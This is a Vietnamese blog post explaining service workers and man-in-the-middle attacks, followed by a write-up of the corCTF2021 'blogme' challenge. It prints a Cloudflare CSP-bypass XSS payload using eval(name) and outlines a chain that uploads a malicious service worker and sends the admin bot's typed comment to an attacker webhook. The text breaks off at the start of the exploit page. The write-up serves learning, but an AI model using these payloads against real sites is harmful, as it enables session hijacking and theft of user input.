<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Service worker và Man-in-the-Middle Attack" /><meta name="author" content="to^" /><meta property="og:locale" content="en" /><meta name="description" content="Một dạng client side attack" /><meta property="og:description" content="Một dạng client side attack" /><link rel="canonical" href="https://to016.github.io//posts/SWandMITM/" /><meta property="og:url" content="https://to016.github.io//posts/SWandMITM/" /><meta property="og:site_name" content="to^" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-05-10T23:43:00+07:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Service worker và Man-in-the-Middle Attack" /><meta name="twitter:site" content="@nguyendt0" /><meta name="twitter:creator" content="@to^" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"to^"},"dateModified":"2022-05-21T04:43:20+07:00","datePublished":"2022-05-10T23:43:00+07:00","description":"Một dạng client side attack","headline":"Service worker và Man-in-the-Middle Attack","mainEntityOfPage":{"@type":"WebPage","@id":"https://to016.github.io//posts/SWandMITM/"},"url":"https://to016.github.io//posts/SWandMITM/"}</script><title>Service worker và Man-in-the-Middle Attack | to^</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="to^"><meta name="application-name" content="to^"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/avatar.jpeg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">to^</a></div><div class="site-subtitle font-italic">Student, CTFer, web warrior</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/to016" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/nguyendt0" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['todinhnguyen1610','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Service worker và Man-in-the-Middle Attack</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1000 400'%3E%3C/svg%3E" data-src="/assets/img/SWandMITM/cyber.jpg" class="preview-img bg" alt="cyber image" width="1000" height="400" data-proofer-ignore><h1 data-toc-skip>Service worker và Man-in-the-Middle Attack</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/nguyendt0">Tô Đỉnh Nguyên</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1652200980" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-05-10 </em> </span> <span> Updated <em class="timeago" data-ts="1653083000" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-05-20 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2175 words"> <em>12 min</em> read</span></div></div></div><div class="post-content"><p><em>Service worker và Man-in-the-Middle Attack</em>, để hiểu rõ được về chúng thì mình sẽ chia ra từng chủ để nhỏ và cuối cùng sẽ một challenge CTF từ năm 2021 để minh họa.</p><h2 id="service-worker-sw-là-gì-"><span class="mr-2">Service worker (SW) là gì ?</span><a href="#service-worker-sw-là-gì-" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="hoàn-cảnh-ra-đời"><span class="mr-2">Hoàn cảnh ra đời</span><a href="#hoàn-cảnh-ra-đời" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Các trình duyệt web sử dụng Javascript như một ngôn ngữ để xử lí các đoạn code bên phía user, nếu html là khung sườn của trang web, css giúp tô điểm cho trang web thì JS góp phần làm cho trang web trở nên sinh động hơn, tương tác hơn với user. Javascript là một “single threaded language”, có nghĩa là nó thực thi các đoạn code theo thứ tự và chỉ khi xong đoạn code phía trước thì mới đến cái tiếp theo.</p><p>Mỗi tab trong một trình duyệt web sẽ tương ứng với một JS thread. Và bởi vì nó là single thread nên nếu các tác vụ phải xử lí quá nhiều trên một thread như vậy sẽ dẫn đến thread này bị blocked và tất nhiên sẽ làm ảnh hướng đến perfomance của trang web đó. Service workers (SW) ra đời đã giải quyết được vấn đề này</p><h3 id="service-worker"><span class="mr-2">Service worker</span><a href="#service-worker" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>SW chỉ đơn giản là một tệp JS. Một điểm để phân biệt giữa SW và một file JS thông thường đó là SW thì chạy trong nền và điều này cũng góp phần làm giảm đi các tác vụ phải xử lí cho JS thread đã nói ở trên. SW cung cấp các tính năng không yêu cầu giao diện hoặc tương tác với người dùng chẳng hạn như đồng bộ ngầm và <a href="https://viblo.asia/p/web-push-notification-maGK7J695j2">push notifications</a> …</p><p>SW đóng vai trò như một proxy giữa web application và network, vì thế mà nó có thể intercept requests và xử lí chúng.</p><p><img data-src="/assets/img/SWandMITM/sw.png" alt="service worker" data-proofer-ignore> <em>service worker</em></p><h2 id="vòng-đời-của-service-worker"><span class="mr-2">Vòng đời của service worker</span><a href="#vòng-đời-của-service-worker" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p><img data-src="https://res.cloudinary.com/scotch/image/upload/v1536590617/kxhshgxmbcl1aw7gncem.png" alt="SW life cycle" data-proofer-ignore> <em>SW life cycle</em></p><p>Vòng đời của một service worker bao gồm 3 giai đoạn chính:</p><ol><li>Registration<li>Installtion<li>Activation</ol><p>Trước khi bắt đầu sử dụng một service worker ta phải đăng kí cho nó như một background process. Đoạn code minh họa cho việc đăng kí một SW:</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="k">if</span> <span class="p">(</span><span class="dl">'</span><span class="s1">serviceWorker</span><span class="dl">'</span> <span class="k">in</span> <span class="nb">navigator</span><span class="p">)</span> <span class="p">{</span>
    <span class="nb">navigator</span><span class="p">.</span><span class="nx">serviceWorker</span><span class="p">.</span><span class="nx">register</span><span class="p">(</span><span class="dl">'</span><span class="s1">/sw.js</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span>
        <span class="na">scope</span><span class="p">:</span> <span class="dl">'</span><span class="s1">/blog/</span><span class="dl">'</span>
    <span class="p">})</span>
    <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">registration</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Service worker registered!</span><span class="dl">'</span><span class="p">);</span>
    <span class="p">})</span>
    <span class="p">.</span><span class="k">catch</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Registration failed!</span><span class="dl">'</span><span class="p">);</span>
    <span class="p">})</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Bởi vì không hẳn là trình duyệt nào cũng hỗ trợ SW nên ta sẽ phải kiểm tra trong <code class="language-plaintext highlighter-rouge">if</code>.</p><p>Bên cạnh đó ta cũng có thể chỉ định <code class="language-plaintext highlighter-rouge">scope</code> cho nó. <code class="language-plaintext highlighter-rouge">Scope</code> là một khái niệm quan trọng trong SW, nó chỉ định path mà SW này sẽ hoạt động. Trong ví dụ trên <code class="language-plaintext highlighter-rouge">scope</code> được set là <code class="language-plaintext highlighter-rouge">/blog/</code> có nghĩa ta đã giới hạn vùng hoạt động của SW chỉ trong trong phạm vi của thư mục <code class="language-plaintext highlighter-rouge">/blog/</code>.</p><p>Một vài điều cần lưu ý về giai đoạn này như sau:</p><ul><li>SW muốn được load thì phải thỏa mãn tính chất same origin.<li>Nếu không cấu hình <code class="language-plaintext highlighter-rouge">scope</code> thì giá trị mặc định của nó là đường dẫn của file JS trong <code class="language-plaintext highlighter-rouge">register()</code>.</ul><p>Sau khi hoàn thành đăng kí, server sẽ tải worker này vào background. Và ngay sau khi nó được tải xuống, SW nhận sự kiện<code class="language-plaintext highlighter-rouge">activate</code> , thường các lập trình viên sẽ dùng nó để khởi tạo các file tĩnh vào trong cache. Kế đó, SW tiến vào trang thái <code class="language-plaintext highlighter-rouge">idle</code> và quyết định trạng thái kế tiếp sẽ là gì. Hoặc là sẽ <code class="language-plaintext highlighter-rouge">terminated</code> đễ tiết kiệm bộ nhớ hoặc là sẽ xử lí các requests bằng sự kiện <code class="language-plaintext highlighter-rouge">fetch</code>/<code class="language-plaintext highlighter-rouge">message</code>. Tất cả các requests thuộc phạm vi đã cấu hình trong <code class="language-plaintext highlighter-rouge">scope</code> sẽ được xử lí.</p><p>Code minh họa cho việc cấu hình sự kiện <code class="language-plaintext highlighter-rouge">fetch</code> trong sw.js như sau:</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="nb">self</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">fetch</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">event</span><span class="p">.</span><span class="nx">respondWith</span><span class="p">(</span><span class="nx">caches</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">request</span><span class="p">))</span>
    <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">response</span> <span class="o">||</span> <span class="nx">fetch</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">request</span><span class="p">);</span>
    <span class="p">});</span>
<span class="p">});</span>
</pre></table></code></div></div><p>Nếu một SW được đăng kí thì trang web vẫn sẽ ưu tiên xử dụng cái cũ và đưa cái mới vào <code class="language-plaintext highlighter-rouge">waiting</code> sate. Một khi trang web đóng hoặc được reload thì SW mới được nạp vào sử dụng. Điểm này nên được chú ý khi muốn thực hiện một cuộc tấn công Man-in-the-Middle Attack.</p><h2 id="man-in-the-middle-attack-mitm-là-gì-"><span class="mr-2">Man-in-the-Middle Attack (MITM) là gì ?</span><a href="#man-in-the-middle-attack-mitm-là-gì-" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Hồi xưa khi đi học chắc hẳn ai cũng đã từng nhận và đưa thư giùm cho mấy đứa trong lớp đúng không. Hồi đó mình còn chỉnh sửa lại thư của chúng nó cơ 😜. Kiểu tấn công này cũng tương tự dựa trên cái ví dụ mà mình đưa ra đó. Nói một cách “security” hơn về khái niệm của nó thì MITM là một kiểu tấn công bí mật xảy ra khi attacker nhảy vào một phiên giao tiếp giữa user hoặc hệ thống. Attacker sẽ mạo danh cả hai bên và có được quyền truy cập vào thông tin mà hai bên đang cố gắng gửi cho nhau. Attacker có thể chặn, gửi và nhận dữ liệu dành cho cả hai bên, mà không có bên nào biết cho đến khi quá muộn.</p><h2 id="mối-liên-hệ-giữa-sw-và-mitm"><span class="mr-2">Mối liên hệ giữa SW và MITM</span><a href="#mối-liên-hệ-giữa-sw-và-mitm" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Tới đây có thể bạn sẽ thắc mắc “thế thì MITM liên quan cái quái gì đến service worker 🤨 ???”</p><p>Mình sẽ đưa ra một ví đụ dơn giản:</p><ul><li>Giả sử một trang web bán hàng bị lỗi stored XSS ở phần comment và có chức năng upload file.<li>User muốn đọc tin tức về sản phẩm hay muốn xem profile cá nhân thì cần truy cập tới <code class="language-plaintext highlighter-rouge">http://shopping.com/products</code>, <code class="language-plaintext highlighter-rouge">http://shopping.com/profile</code>.<li>Tính năng upload sẽ lưu file của user tại đường dẫn <code class="language-plaintext highlighter-rouge">http://shopping.com/uploads/&lt;filename&gt;</code>.<li>Stored XSS xảy ra ở phần comment của các sản phẩm.</ul><p>Kịch bản tấn công sẽ như sau:</p><ul><li>Attacker sẽ upload 1 file SW - <code class="language-plaintext highlighter-rouge">sw.js</code>.<li>Ở phần comment của sản phẩm dùng JS để đăng kí SW <code class="language-plaintext highlighter-rouge">register(http://shopping.com/uploads/sw.js)</code>.<li>Trong file <code class="language-plaintext highlighter-rouge">sw.js</code> này cấu hình <code class="language-plaintext highlighter-rouge">scope: '/'</code> và sự kiện <code class="language-plaintext highlighter-rouge">fetch</code> trả về reponse <code class="language-plaintext highlighter-rouge">YOU ARE HACKED</code>.</ul><p>Một khi user ấn vào để xem comment của sản phẩm thì vô tình trigger đống JS code -&gt; register SW -&gt; pwned. Lúc này khi user muốn xem profile hay thông tin sản phẩm thì thứ hiển thị chỉ là dòng chữ <code class="language-plaintext highlighter-rouge">YOU ARE HACKED</code> của attacker 😈.</p><p>Ở đây mình chỉ đưa ra ví dụ về “Response modification” các bạn có thêm xem thêm tại <a href="https://www.akamai.com/blog/security/abusing-the-service-workers-api">đây</a>.</p><p>Qua ví dụ đơn giản này ta có thể thấy việc attacker lợi dụng service woker, hoạt động như một proxy, và kết hợp với MITM để thực hiện một cuộc tấn công phía người dùng.</p><hr /><h2 id="blogme---corctf2021"><span class="mr-2">blogme - corCTF2021</span><a href="#blogme---corctf2021" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Challenge này là một cách để thực tế hóa đống lí thuyết nãy giờ. Mình cũng sẽ tiến hành phân tích hướng giải quyết cho nó dựa trên tinh thần học hỏi từ tác giả là chính.</p><h3 id="source-code"><span class="mr-2"><em>Source code</em></span><a href="#source-code" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p><a href="https://github.com/strellic/my-ctf-challenges/tree/main/corCTF-2021">https://github.com/strellic/my-ctf-challenges/tree/main/corCTF-2021</a></p><h3 id="overview"><span class="mr-2"><em>Overview</em></span><a href="#overview" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p><img data-src="/assets/img/SWandMITM/overview.png" alt="overview" data-proofer-ignore> <em>overview</em></p><p>Trang web hiển thị một vài post của admin và có các chức năng như <code class="language-plaintext highlighter-rouge">Profile</code>, <code class="language-plaintext highlighter-rouge">Your Posts</code>, <code class="language-plaintext highlighter-rouge">Logout</code>, <code class="language-plaintext highlighter-rouge">Comment</code>.</p><ul><li><p><code class="language-plaintext highlighter-rouge">Profile</code>: tạo post, upload image file và có thể dùng để set avatar. <img data-src="/assets/img/SWandMITM/profile.png" alt="profile" data-proofer-ignore> <em>profile</em></p><li><code class="language-plaintext highlighter-rouge">Your Posts</code>: hiển thị các post đã tạo. <img data-src="/assets/img/SWandMITM/your_posts.png" alt="your posts" data-proofer-ignore> <em>your posts</em><li><code class="language-plaintext highlighter-rouge">Comment</code>: bình luận về một post bằng cách gửi data tới <code class="language-plaintext highlighter-rouge">../api/comment/&lt;post id&gt;</code>. <img data-src="/assets/img/SWandMITM/comment.png" alt="comment" data-proofer-ignore> <em>comment</em></ul><h3 id="phân-tích"><span class="mr-2"><em>Phân tích</em></span><a href="#phân-tích" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>HTML bị escaped ở tất cả các chỗ ngoại trừ post page. Nhưng tác giả có dùng CSP:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>object-src 'none';
script-src 'self' 'unsafe-eval';
</pre></table></code></div></div><p>Và ở post thứ 3 của admin cũng có để gợi ý:</p><p>“wow, a lot of people have signed up and posted stuff! my bandwith was starting to get a little high, but Cloudflare (wink) (NOT SPONSORED) saved the day :D”</p><p>Để bypass thì ta có thể thử tra “cloudflare csp bypass unsafe-eval”, tìm được một payload trên <a href="https://twitter.com/kinugawamasato/status/1414648695904083988">tweet</a>. Theo đó, mình nhận ra để áp dụng cách này thì trang web phải nằm trên một cloudfare domain, vì mình không có điều kiện mua domain 😅 nên chắc chỉ dừng lại ở mức phân tích thôi.</p><p>post length bị giới hạn chỉ được max là 300 kí tự nên tác giả đã reconstruct lại payload:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">_cf_translation</span><span class="nt">&gt;&lt;img</span> <span class="na">id=</span><span class="s">lang-selector</span> <span class="na">name=</span><span class="s">blobs</span><span class="nt">&gt;&lt;output</span> <span class="na">id=</span><span class="s">locale</span><span class="nt">&gt;&lt;script&gt;</span><span class="nb">eval</span><span class="p">(</span><span class="nx">name</span><span class="p">)</span><span class="nt">&lt;/script&gt;&lt;/output&gt;&lt;/form&gt;&lt;a</span> <span class="na">data-translate=</span><span class="s">value</span><span class="nt">&gt;&lt;/a&gt;&lt;script </span><span class="na">src=</span><span class="s">/cdn-cgi/scripts/zepto.min.js</span><span class="nt">&gt;&lt;/script&gt;&lt;script </span><span class="na">src=</span><span class="s">/cdn-cgi/scripts/cf.common.js</span><span class="nt">&gt;&lt;/script&gt;&lt;script </span><span class="na">src=</span><span class="s">/cdn-cgi/scripts/cf.common.js</span><span class="nt">&gt;&lt;/script&gt;</span>
</pre></table></code></div></div><p>Nhờ vào <code class="language-plaintext highlighter-rouge">eval(name)</code> ta có thể execute JS code chèn vào từ <code class="language-plaintext highlighter-rouge">window.name</code>.</p><p>Đoạn code xử lí file upload thực hiện filter và chỉ nhận image trên server: <img data-src="/assets/img/SWandMITM/filterFileUpload.png" alt="filter upload file" data-proofer-ignore> <em>filter upload file</em></p><p>Ở đây ta nhận thấy nếu user là admin thì sẽ không cần phải check type của file upload nên mục đích là kết hợp với <code class="language-plaintext highlighter-rouge">csrf</code> để upload file.</p><p>Admin bot có nhiệm vụ navigate tới <code class="language-plaintext highlighter-rouge">/api/comment</code> sau khi view post của ta, gõ flag vào ô comment và ấn submit.</p><p>Sau khi thử tạo một post với nội dung là <code class="language-plaintext highlighter-rouge">corCTF{test_flag}</code> để tự test thì mình nhận ra nội dung đã bị thay đổi, đoạn code đó nằm ở: <img data-src="/assets/img/SWandMITM/replaceFlagComment.png" alt="replace flag comment" data-proofer-ignore> <em>replace flag comment</em></p><p>Vầy là ta phải nghĩ ra một cách để lấy được nội dung của comment mà không bị server thay đổi giá trị.</p><p>Hướng đi của tác giả như sau: force admin bot upload một <code class="language-plaintext highlighter-rouge">sw.js</code> file, file này ta có thể access tới bằng đường dẫn <code class="language-plaintext highlighter-rouge">/api/file?id=&lt;file-id&gt;</code>. Comment page ở đường dẫn <code class="language-plaintext highlighter-rouge">/api/comment</code> cùng với file upload đều thuộc cùng thư mục <code class="language-plaintext highlighter-rouge">/api</code> nên service woker có thể hoạt động trên comment page.</p><p>Tác giả tạo một sự kiện <code class="language-plaintext highlighter-rouge">fetch</code> trong <code class="language-plaintext highlighter-rouge">sw.js</code> để ngăn không cho request đi đến server mà tự trả về response nhờ vào SW. Response trả về không phải là <code class="language-plaintext highlighter-rouge">/api/comment</code> ban đầu nữa, mà thay vào đó là một page theo kiểu Phishing, khi admin bot gõ comment và ấn submit thì nội dung của comment sẽ được gửi đến webhook của ta.</p><p>Các bước chuẩn bị:</p><ul><li>Một post với content: <code class="language-plaintext highlighter-rouge">&lt;meta http-equiv="refresh" content="0;url=https://exploitpage" /&gt;</code><li>Một post dùng để bypass CSP (tạm gọi id của post này là <code class="language-plaintext highlighter-rouge">EVAL_POSTID</code>) với content:</ul><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">_cf_translation</span><span class="nt">&gt;&lt;img</span> <span class="na">id=</span><span class="s">lang-selector</span> <span class="na">name=</span><span class="s">blobs</span><span class="nt">&gt;&lt;output</span> <span class="na">id=</span><span class="s">locale</span><span class="nt">&gt;&lt;script&gt;</span><span class="nb">eval</span><span class="p">(</span><span class="nx">name</span><span class="p">)</span><span class="nt">&lt;/script&gt;&lt;/output&gt;&lt;/form&gt;&lt;a</span> <span class="na">data-translate=</span><span class="s">value</span><span class="nt">&gt;&lt;/a&gt;&lt;script </span><span class="na">src=</span><span class="s">/cdn-cgi/scripts/zepto.min.js</span><span class="nt">&gt;&lt;/script&gt;&lt;script </span><span class="na">src=</span><span class="s">/cdn-cgi/scripts/cf.common.js</span><span class="nt">&gt;&lt;/script&gt;&lt;script </span><span class="na">src=</span><span class="s">/cdn-cgi/scripts/cf.common.js</span><span class="nt">&gt;&lt;/script&gt;</span>
</pre></table></code></div></div><p>Khai thác:</p><ul><li>Stage 1: gửi admin một url trỏ tới post chứa meta tag -&gt; redirect đến exploit page, tại đây set <code class="language-plaintext highlighter-rouge">window.name</code> bằng payload dùng để upload <code class="language-plaintext highlighter-rouge">sw.js</code>, sau đó redirect về lại <code class="language-plaintext highlighter-rouge">https://blogme.be.ax/post/${EVAL_POSTID}</code> -&gt; lúc này payload sẽ được executed và gửi id của file <code class="language-plaintext highlighter-rouge">sw.js</code> (<code class="language-plaintext highlighter-rouge">SW_FILEID</code>) đã được upload đến webhook.<li>Stage 2: register <code class="language-plaintext highlighter-rouge">sw.js</code> đã upload <code class="language-plaintext highlighter-rouge">register('https://blogme.be.ax/api/file?id=${SW_FILEID}')</code></ul><h3 id="khai-thác"><span class="mr-2"><em>Khai thác</em></span><a href="#khai-thác" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Exploit code:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
</pre><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>

<span class="nt">&lt;body&gt;</span>
    <span class="c">&lt;!--
    make two pages, one with the meta tag, and the other with the form tag csp bypass
    set eval post id to the id of the meta tag
    at window.name at the bottom, run stage1 first.
    send the post that has the meta redirect to the admin
    this sends the file id of the service worker to a webhook, which you can then set as service worker file id.
    then, change it to run stage2
    your webhook should have the flag!
  --&gt;</span>
    <span class="c">&lt;!--
